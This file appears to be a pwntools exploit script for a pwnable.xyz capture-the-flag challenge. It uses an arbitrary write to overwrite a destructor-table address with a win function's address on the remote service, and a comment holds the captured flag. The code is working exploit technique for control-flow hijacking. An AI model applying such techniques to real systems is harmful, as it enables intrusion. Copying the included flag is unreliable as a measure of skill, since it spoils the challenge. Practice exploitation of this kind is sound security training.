from pwn import *
import time

# 0x7fffffffdc68 stack pointer is this, I can try to brute force maybe since we have arb write
# Across runs, it seems like everything is kind of randomized 
# yea probs not 
def main():

    # puts = "0x7f"
    # to_write = "0x7fffffffdc68"
    elf = ELF('./challenge')
    to_write = "0x600dc8"
    to_write = "0x600bc0"
    
    # win = 0x400821 
    # win = "0x41414141"
    win = "0x400821"
    print(hex(elf.get_section_by_name('.fini_array').header.sh_addr))
# p.sendlineafter('mine: ',hex(binary.get_section_by_name('.fini_array').header.sh_addr))
    # input()
    r = process('./challenge')
    r = remote('svc.pwnable.xyz', 30033)
#     gdb.attach(r, gdbscript='''
    #
# b get_val
# ''')
#     time.sleep(4)
#
    r.sendafter(": ", to_write)
    r.sendafter(": ", win)
    

    r.interactive()
    # flag: FLAG{dt0rs_are_n0w_ch3ck3d}

if __name__ == '__main__':
    main()
